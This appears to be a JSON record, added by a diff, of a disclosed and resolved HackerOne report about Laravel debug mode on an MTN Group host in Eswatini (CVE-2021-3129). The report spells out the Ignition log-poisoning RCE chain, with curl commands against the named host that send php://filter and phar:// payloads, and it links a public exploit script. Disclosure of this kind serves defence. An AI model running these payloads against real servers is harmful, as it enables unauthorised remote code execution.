@@ -1,0 +1,162 @@
+{
+  "id": 2765259,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzY1MjU5",
+  "url": "https://hackerone.com/reports/2765259",
+  "title": "Information disclosure due to debug mode enabled at Laravel instance https://mpos.mtn.co.sz/ ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2024-10-08T05:25:35.641Z",
+  "submitted_at": "2024-10-08T05:25:35.982Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "odaysec",
+    "url": "/odaysec",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/cqjxx3wbhejfzvl1dwusepkdthvr/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 41919,
+    "url": "https://hackerone.com/mtn_group",
+    "handle": "mtn_group",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MTN Group",
+      "twitter_handle": "",
+      "website": "https://www.mtn.com/",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2021-3129"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-02-23T09:03:31.950Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-01-24T09:03:23.587Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nCVE-2021-3129 is a Remote Code Execution vulnerability in the Laravel framework which takes advantage of unsafe usage of PHP. This vulnerability and the steps to exploit it follow a similar path to a classic log poisoning attack. In typical log poisoning, the attacker needs to exploit a local file inclusion first in order to achieve remote code execution, while in the Laravel framework, we need the Ignition module (Ignition is a page for displaying an error) and a specific chain to trigger this vulnerability. This security issue is relatively easy to exploit and does not require user authentication which is one of the reasons why it has a 9.8 CVSSv3 score.\n\n\n\n{F3661989}\n\nIn Laravel ignition mode, we have a class named MakeViewVariableOptionalSolution which invokes both functions to be triggered by sending a POST request to `/_ignition/execute-solution`. It does this using a JSON payload which includes a viewFile `parameter`. The action of reading and writing a file doesn’t give us more insights, but PHP allows us to use filters like `php://filter/write=convert.base64-decode/resource=path/to/a/specific/file` , and `phar:///path/to/specific/file` to modify and execute PHP serializable code .  However, this is not enough to trigger RCE. Default Laravel has the log file in storage/logs/laravel.log which includes every PHP error. Writing malicious content with the purpose of decoding and executing it won’t work at first, because PHP ignores bad characters when decoding base64, so the error won’t be written in the Laravel log file. \n\nMoreover, the log file has more entries that affect our payload. Hopefully, we can invoke php:// again to clear the log file and have only our payload executed and injected twice. But we need one more step.  The length of the final payload in the log file is different from one target to another because of the absolute path, which could result in bad decoding of the base64 payload.  One of the last methods I tried to trigger the RCE is to use base64 decode for UTF-16, which aligns the payload for 2 bytes. In this case, the first payload is correctly decoded, thus the second one will be decoded correctly too. \n\n{F3662012}\n\n```javascript\ncurl -XPOST -H 'Content-Type: application/json'  -d ‘{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"test\", \"viewFile\": \"php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\"}, }’  http(s)://mpos.mtn.co.sz/_ignition/execute-solution\n```\n```javascript\ncurl -XPOST -H 'Content-Type: application/json'  -d ‘{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"test\", \"viewFile\": \"AA\"}, }’  http(s)://mpos.mtn.co.sz/_ignition/execute-solution\n```\n```javascript\ncurl -XPOST -H 'Content-Type: application/json'  -d ‘{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"test\", \"viewFile\": \"=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=70=00=4E=00=41=00=51=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=...\"}, }’  http(s)://mpos.mtn.co.sz/_ignition/execute-solution\n```\n```javascript\ncurl -XPOST -H 'Content-Type: application/json'  -d ‘{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"test\", \"viewFile\": \"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log\"}, }’  http(s)://mpos.mtn.co.sz/_ignition/execute-solution\n```\n```javascript\ncurl -XPOST -H 'Content-Type: application/json'  -d ‘{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"test\", \"viewFile\": \"phar://../storage/logs/laravel.log\"}, }’  http(s)://mpos.mtn.co.sz/_ignition/execute-solution\n```\n 1. Navigate visit directory hostname on https://mpos.mtn.co.sz\n 1. Intercept request to burp-suite and following directory parameter on `/srvgtw001/merchant/password/reset`\n\n```\nGET /srvgtw001/merchant/password/reset HTTP/1.1\nHost: mpos.mtn.co.sz\nCookie: cookiesession1=678B28894C92B8E298EA67025D4086C2\nCache-Control: max-age=0\nSec-Ch-Ua: \"Not;A=Brand\";v=\"24\", \"Chromium\";v=\"128\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nAccept-Language: en-US,en;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br\nPriority: u=0, i\nConnection: keep-alive\n```\n\n 1. You can see the laravel-debug-enable \n 1. Lets save exploit bellow as `exploit.py`\n\n```\nhttps://raw.githubusercontent.com/joshuavanderpoll/CVE-2021-3129/refs/heads/main/CVE-2021-3129.py\n```\n 1. This script is designed to exploit the Remote Code Execution (RCE) vulnerability identified in several Laravel versions, known as CVE-2021-3129. By leveraging this vulnerability, the script allows users to write and execute commands on a target website running a vulnerable Laravel instance, provided that the \"APP_DEBUG\" configuration is set to \"true\" in the \".env\" file.\n 1. And the output of the command should be available in the last response received from the target.\n\n\n{F3662009}\n\n## Impact\n\nIgnition, a popular debug tool in the Laravel ecosystem, played a crucial role in assisting developers during the application development process. However, its functionality came with a vulnerability that exposed websites using Laravel versions <= 8.4.2 with debug mode enabled to the risk of RCE attacks. This critical vulnerability allowed unauthenticated attackers to execute arbitrary code remotely, potentially wreaking havoc on application data, server resources, and user privacy.",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 3661989,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/57q8qbusn8uudqps24yxg3roroxb?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSA53OZRN%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T201307Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDN37G4PPtzyTXU07KcA8mSt5cdpHKzCa7QhmptDs1exgIgMK3E4YKRHkr63CdWzzUvZ93bnRFhY3AIKzobXU9spy8quwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHzzuvLxUY7SApsMZiqPBSCSlWj8KdhfulR2JEQZx4RIpxAxRq5rm9Y4PsdaPYWR5QpCm%2BUGsLH%2FoQ0Pzzncq2h%2Fdd0EjDn%2BXpir8LA2LF6pSYJAmFe7qTbkhKI429G6oQdxsN%2FCk5r3bg84W8HolWR2UpQKWwufPaURr%2F0qAq2QY2440lJ3w7XFHfhq9AUdatxRISmscFJcsSl8bV0g0MBZwQ6n5FP%2FwdyOx9NtSARNT9whnZ51xpBkaMG6XzoccptQ8NzguzpCJDNDH6CScnn0vfokEChcQ12sax7RS4HJ%2Fr7wOLMMtfzPu2xuTvCb8B9rI07GOakqIgXtQDkq3%2B8t2xmdVYcOekEYrAjMmMUuO9NA%2FEuS97KvcDwZa13Hcn%2BO3D1OV%2BrerARs5o6ppDeH%2FR%2BHgOLW43nBXKgKHjtlTE4el5HXMgew8OPJDRTbGRcHq5D7x2N2C23mN9qVkZ1KegdwllK%2BdFtfODXP406Jv8LFclB6qGQ6htao8j%2BqsGM%2BqfTWyJ6dPyhTLYs6zSdt1DPSdag48e1KH4CRxLCNTvZCGByILZ7x2SMZjPyV3jmI1HhaLYczENAF4zgks1qy6BDlmGDDx25C9jvc6xtE8YxKW2cMqxEDWYgrQsfSMlS1Mc4os9GrNJ4lOIkydqdPy4ozf0RXtwkLde3RP5w%2FnpVM16jZM5v5MWk4KtPABozie%2F8I0LP4tEQus5vXVuYjBWwOExmp9315tEVygmzkIxq%2BMHHItnYEiajCv74L39rFdz7nGaAcuVnMwpsc9p73ViduH87IAExFseNxIVnw0HclILO5vaFEDVGzR0%2FAsKOw415PjZ9zGX3xelNS5HMMvL6Ltc%2B4Jv1UJbvGELDCa3FA%2BuoP3J4dz89V1Ecww8XizAY6sQFhY3%2F454wweIVwd7GbPjQ%2F5ConieIRu0K1%2FSvYOdm%2Fv3ytQf83NfTwVMgnaZxg832Bhjv8erx5pzyzj2HAJ1T98k3yN2Yk0eAhRgAev%2FnVpmTQstcIQbmBFxj1Mg7BkFsJg4gw39mbqcfRvRgqaiNZACKNdbR6IO%2B8LdeawFNEpuer3X69Ni9ZJAYlMi6W6wpPDhfgjd3IzleuAhkgvwuSwjd3JTOoh5A1fFX8j%2FqC%2BA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=53ed5ac3cc82d8f5206ac9f5e22c0b34ca6643cbceb2bbda1a5cddb1d782fa08",
+      "file_size": 96503,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 3662009,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6qx0nt4mviu0wcvtfunvvq070r2d?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSA53OZRN%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T201307Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDN37G4PPtzyTXU07KcA8mSt5cdpHKzCa7QhmptDs1exgIgMK3E4YKRHkr63CdWzzUvZ93bnRFhY3AIKzobXU9spy8quwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHzzuvLxUY7SApsMZiqPBSCSlWj8KdhfulR2JEQZx4RIpxAxRq5rm9Y4PsdaPYWR5QpCm%2BUGsLH%2FoQ0Pzzncq2h%2Fdd0EjDn%2BXpir8LA2LF6pSYJAmFe7qTbkhKI429G6oQdxsN%2FCk5r3bg84W8HolWR2UpQKWwufPaURr%2F0qAq2QY2440lJ3w7XFHfhq9AUdatxRISmscFJcsSl8bV0g0MBZwQ6n5FP%2FwdyOx9NtSARNT9whnZ51xpBkaMG6XzoccptQ8NzguzpCJDNDH6CScnn0vfokEChcQ12sax7RS4HJ%2Fr7wOLMMtfzPu2xuTvCb8B9rI07GOakqIgXtQDkq3%2B8t2xmdVYcOekEYrAjMmMUuO9NA%2FEuS97KvcDwZa13Hcn%2BO3D1OV%2BrerARs5o6ppDeH%2FR%2BHgOLW43nBXKgKHjtlTE4el5HXMgew8OPJDRTbGRcHq5D7x2N2C23mN9qVkZ1KegdwllK%2BdFtfODXP406Jv8LFclB6qGQ6htao8j%2BqsGM%2BqfTWyJ6dPyhTLYs6zSdt1DPSdag48e1KH4CRxLCNTvZCGByILZ7x2SMZjPyV3jmI1HhaLYczENAF4zgks1qy6BDlmGDDx25C9jvc6xtE8YxKW2cMqxEDWYgrQsfSMlS1Mc4os9GrNJ4lOIkydqdPy4ozf0RXtwkLde3RP5w%2FnpVM16jZM5v5MWk4KtPABozie%2F8I0LP4tEQus5vXVuYjBWwOExmp9315tEVygmzkIxq%2BMHHItnYEiajCv74L39rFdz7nGaAcuVnMwpsc9p73ViduH87IAExFseNxIVnw0HclILO5vaFEDVGzR0%2FAsKOw415PjZ9zGX3xelNS5HMMvL6Ltc%2B4Jv1UJbvGELDCa3FA%2BuoP3J4dz89V1Ecww8XizAY6sQFhY3%2F454wweIVwd7GbPjQ%2F5ConieIRu0K1%2FSvYOdm%2Fv3ytQf83NfTwVMgnaZxg832Bhjv8erx5pzyzj2HAJ1T98k3yN2Yk0eAhRgAev%2FnVpmTQstcIQbmBFxj1Mg7BkFsJg4gw39mbqcfRvRgqaiNZACKNdbR6IO%2B8LdeawFNEpuer3X69Ni9ZJAYlMi6W6wpPDhfgjd3IzleuAhkgvwuSwjd3JTOoh5A1fFX8j%2FqC%2BA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3db8803613c91f40dbec9f1b225aa644bfe970af6b8b76f3669c33f5828ee964",
+      "file_size": 58805,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 3662012,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nuiivpmp42bvbrdepctc014mc2tu?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSA53OZRN%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T201307Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDN37G4PPtzyTXU07KcA8mSt5cdpHKzCa7QhmptDs1exgIgMK3E4YKRHkr63CdWzzUvZ93bnRFhY3AIKzobXU9spy8quwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHzzuvLxUY7SApsMZiqPBSCSlWj8KdhfulR2JEQZx4RIpxAxRq5rm9Y4PsdaPYWR5QpCm%2BUGsLH%2FoQ0Pzzncq2h%2Fdd0EjDn%2BXpir8LA2LF6pSYJAmFe7qTbkhKI429G6oQdxsN%2FCk5r3bg84W8HolWR2UpQKWwufPaURr%2F0qAq2QY2440lJ3w7XFHfhq9AUdatxRISmscFJcsSl8bV0g0MBZwQ6n5FP%2FwdyOx9NtSARNT9whnZ51xpBkaMG6XzoccptQ8NzguzpCJDNDH6CScnn0vfokEChcQ12sax7RS4HJ%2Fr7wOLMMtfzPu2xuTvCb8B9rI07GOakqIgXtQDkq3%2B8t2xmdVYcOekEYrAjMmMUuO9NA%2FEuS97KvcDwZa13Hcn%2BO3D1OV%2BrerARs5o6ppDeH%2FR%2BHgOLW43nBXKgKHjtlTE4el5HXMgew8OPJDRTbGRcHq5D7x2N2C23mN9qVkZ1KegdwllK%2BdFtfODXP406Jv8LFclB6qGQ6htao8j%2BqsGM%2BqfTWyJ6dPyhTLYs6zSdt1DPSdag48e1KH4CRxLCNTvZCGByILZ7x2SMZjPyV3jmI1HhaLYczENAF4zgks1qy6BDlmGDDx25C9jvc6xtE8YxKW2cMqxEDWYgrQsfSMlS1Mc4os9GrNJ4lOIkydqdPy4ozf0RXtwkLde3RP5w%2FnpVM16jZM5v5MWk4KtPABozie%2F8I0LP4tEQus5vXVuYjBWwOExmp9315tEVygmzkIxq%2BMHHItnYEiajCv74L39rFdz7nGaAcuVnMwpsc9p73ViduH87IAExFseNxIVnw0HclILO5vaFEDVGzR0%2FAsKOw415PjZ9zGX3xelNS5HMMvL6Ltc%2B4Jv1UJbvGELDCa3FA%2BuoP3J4dz89V1Ecww8XizAY6sQFhY3%2F454wweIVwd7GbPjQ%2F5ConieIRu0K1%2FSvYOdm%2Fv3ytQf83NfTwVMgnaZxg832Bhjv8erx5pzyzj2HAJ1T98k3yN2Yk0eAhRgAev%2FnVpmTQstcIQbmBFxj1Mg7BkFsJg4gw39mbqcfRvRgqaiNZACKNdbR6IO%2B8LdeawFNEpuer3X69Ni9ZJAYlMi6W6wpPDhfgjd3IzleuAhkgvwuSwjd3JTOoh5A1fFX8j%2FqC%2BA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b8e7b79d9ea86870131729e0089331a47235917e9abc41ad2ab13948992d6d5d",
+      "file_size": 114779,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2025-02-23T09:03:23.778Z",
+  "allow_singular_disclosure_after": -31316983.29998562,
+  "singular_disclosure_allowed": true,
+  "vote_count": 57,
+  "voters": [
+    "hossam13",
+    "newday_newlife",
+    "aboalezz",
+    "k0ns0l",
+    "starlox",
+    "raslanco",
+    "mohaned0101",
+    "thalaivar304",
+    "2026",
+    "aliyueka",
+    "and 47 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 34323,
+    "asset_type": "URL",
+    "asset_identifier": "mtn.co.sz",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
